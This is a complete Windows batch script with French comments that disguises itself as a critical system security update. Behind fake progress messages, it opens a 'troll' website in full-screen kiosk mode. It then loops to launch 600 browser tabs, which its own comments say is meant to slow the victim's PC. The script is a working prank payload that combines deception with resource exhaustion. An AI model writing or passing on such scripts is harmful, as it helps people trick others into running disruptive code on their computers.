@echo off
title MISE A JOUR SYSTEME CRITIQUE
color 0a
echo Initialisation de la mise a jour...
timeout /t 2 >nul
echo Verification des fichiers systeme...
timeout /t 2 >nul
echo Deploiement du patch de securite...
timeout /t 2 >nul

:: 1. Ouvre la page du troll en PLEIN ECRAN (mode kiosque)
start chrome --kiosk "https://member-cleanup.vercel.app"
timeout /t 2 >nul

:: 2. Ouvre 200 onglets en arriere-plan pour faire ramer le PC
for /l %%x in (1, 1, 200) do (
    start chrome "https://www.roblox.com"
    start chrome "https://www.youtube.com"
    start chrome "https://www.google.com/search?q=666"
)